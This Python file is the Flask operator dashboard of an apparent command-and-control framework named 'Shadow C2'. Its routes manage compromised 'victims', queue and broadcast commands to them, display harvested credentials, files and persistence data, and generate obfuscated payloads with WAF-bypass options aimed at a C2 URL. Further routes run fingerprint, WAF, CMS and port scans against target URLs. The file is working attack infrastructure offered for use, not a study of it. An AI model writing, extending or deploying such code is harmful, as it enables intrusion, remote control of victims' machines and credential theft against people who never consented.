#!/usr/bin/env python3
"""Shadow C2 — Dashboard Routes (Operator Web Interface)"""

import os
import json
import time
import functools
from flask import (Blueprint, render_template, request, redirect, url_for,
                   session, jsonify, flash, send_file, current_app)

from server.config import OPERATOR_USERNAME, OPERATOR_PASSWORD

dash_bp = Blueprint('dashboard', __name__, url_prefix='/dashboard',
                    template_folder='../../frontend/templates',
                    static_folder='../../frontend/static')


# -- auth decorator ----------------------------------------------------------

def login_required(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('dashboard.login'))
        return f(*args, **kwargs)
    return decorated


def get_db():
    return current_app.config["DATABASE"]

def get_handler():
    return current_app.config["C2_HANDLER"]

def get_generator():
    return current_app.config["GENERATOR"]


# -- auth routes -------------------------------------------------------------

@dash_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if username == OPERATOR_USERNAME and password == OPERATOR_PASSWORD:
            session['authenticated'] = True
            session['username'] = username
            db = get_db()
            db.log_action("login", f"Operator login: {username}", request.remote_addr)
            return redirect(url_for('dashboard.index'))
        return render_template('login.html', error="Invalid credentials")
    return render_template('login.html', error=None)


@dash_bp.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('dashboard.login'))


# -- dashboard pages ---------------------------------------------------------

@dash_bp.route('/')
@login_required
def index():
    db = get_db()
    stats = db.get_stats()
    logs = db.get_logs(limit=20)
    return render_template('dashboard.html', stats=stats, logs=logs)


@dash_bp.route('/victims')
@login_required
def victims():
    db = get_db()
    status_filter = request.args.get('status', '')
    search = request.args.get('search', '')
    victim_list = db.list_victims(status=status_filter if status_filter else None)
    if search:
        victim_list = [v for v in victim_list
                       if search.lower() in str(v).lower()]
    return render_template('victims.html', victims=victim_list)


@dash_bp.route('/victim/<int:victim_id>')
@login_required
def victim_detail(victim_id):
    db = get_db()
    victim = db.get_victim(victim_id)
    if not victim:
        return redirect(url_for('dashboard.victims'))
    commands = db.get_command_history(victim_id, limit=50)
    files = db.get_files(victim_id)
    creds = db.get_credentials(victim_id)
    persistence = db.get_persistence(victim_id)
    return render_template('terminal.html', victim=victim, commands=commands,
                          files=files, creds=creds, persistence=persistence,
                          victim_id=victim_id)


@dash_bp.route('/terminal/<int:victim_id>')
@login_required
def terminal(victim_id):
    db = get_db()
    victim = db.get_victim(victim_id)
    if not victim:
        return redirect(url_for('dashboard.victims'))
    return render_template('terminal.html', victim=victim, victim_id=victim_id)


@dash_bp.route('/files/<int:victim_id>')
@login_required
def files(victim_id):
    db = get_db()
    victim = db.get_victim(victim_id)
    return render_template('files.html', victim=victim, victim_id=victim_id)


@dash_bp.route('/generator')
@login_required
def generator():
    gen = get_generator()
    return render_template('generator.html',
                          payload_types=gen.list_payload_types(),
                          encoders=gen.list_encoders(),
                          waf_bypasses=gen.list_waf_bypasses())


@dash_bp.route('/recon')
@login_required
def recon():
    return render_template('recon.html')


@dash_bp.route('/database')
@login_required
def database():
    db = get_db()
    creds = db.get_credentials()
    return render_template('database.html', credentials=creds)


@dash_bp.route('/settings')
@login_required
def settings():
    return render_template('settings.html')


# -- AJAX API endpoints for dashboard ---------------------------------------

@dash_bp.route('/api/stats')
@login_required
def api_stats():
    return jsonify(get_db().get_stats())


@dash_bp.route('/api/victims')
@login_required
def api_victims():
    db = get_db()
    return jsonify(db.list_victims())


@dash_bp.route('/api/command', methods=['POST'])
@login_required
def api_command():
    data = request.get_json()
    victim_id = data.get('victim_id')
    command = data.get('command', '')
    db = get_db()
    victim = db.get_victim(victim_id)
    if not victim:
        return jsonify({"error": "Victim not found"}), 404
    handler = get_handler()
    cmd_id = handler.queue_command(victim['uuid'], command)
    return jsonify({"status": "queued", "command_id": cmd_id})


@dash_bp.route('/api/broadcast', methods=['POST'])
@login_required
def api_broadcast():
    data = request.get_json()
    command = data.get('command', '')
    tag = data.get('tag_filter', '')
    handler = get_handler()
    ids = handler.broadcast_command(command, tag_filter=tag if tag else None)
    return jsonify({"status": "broadcast", "count": len(ids)})


@dash_bp.route('/api/victim/<int:victim_id>', methods=['DELETE'])
@login_required
def api_delete_victim(victim_id):
    get_db().delete_victim(victim_id)
    return jsonify({"status": "deleted"})


@dash_bp.route('/api/victim/<int:victim_id>/tag', methods=['POST'])
@login_required
def api_tag_victim(victim_id):
    data = request.get_json()
    tag = data.get('tag', '')
    db = get_db()
    victim = db.get_victim(victim_id)
    if victim:
        current_tags = victim.get('tags', '')
        new_tags = f"{current_tags},{tag}" if current_tags else tag
        db.update_victim(victim_id, tags=new_tags)
    return jsonify({"status": "tagged"})


# -- Payload generation (AJAX) ----------------------------------------------

@dash_bp.route('/generate', methods=['POST'])
@login_required
def generate_payload():
    options = request.get_json()
    gen = get_generator()
    try:
        result = gen.generate(options)
        db = get_db()
        db.add_generated_payload(
            filename=result["filename"],
            payload_type=options.get("payload_type", ""),
            encoding_layers=json.dumps(options.get("encoding_layers", [])),
            obfuscation_method=f"level_{options.get('obfuscation_level', 5)}",
            waf_bypasses=json.dumps(options.get("waf_targets", [])),
            target_info=options.get("c2_url", ""),
            sha256=result["sha256"],
            size=result["size"],
        )
        db.log_action("payload_generated", f"Generated {result['filename']}", request.remote_addr)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@dash_bp.route('/download-payload/<filename>')
@login_required
def download_payload(filename):
    from server.config import PAYLOAD_OUTPUT_DIR
    filepath = os.path.join(PAYLOAD_OUTPUT_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True, download_name=filename)
    return jsonify({"error": "Not found"}), 404


# -- Recon (AJAX) -----------------------------------------------------------

@dash_bp.route('/recon/scan', methods=['POST'])
@login_required
def recon_scan():
    data = request.get_json()
    target_url = data.get('url', '')
    scan_types = data.get('scan_types', ['fingerprint'])
    results = {}

    if 'fingerprint' in scan_types:
        from server.recon.fingerprint import TargetFingerprint
        results['fingerprint'] = TargetFingerprint().fingerprint(target_url)

    if 'waf' in scan_types:
        from server.recon.waf_detect import WAFDetector
        results['waf'] = WAFDetector().detect(target_url)

    if 'cms' in scan_types:
        from server.recon.cms_detect import CMSDetector
        results['cms'] = CMSDetector().detect(target_url)

    if 'ports' in scan_types:
        from server.recon.port_scan import PortScanner
        from urllib.parse import urlparse
        host = urlparse(target_url).hostname or target_url
        results['ports'] = PortScanner().tcp_connect_scan(host)

    get_db().log_action("recon_scan", f"Scanned {target_url}", request.remote_addr)
    return jsonify(results)
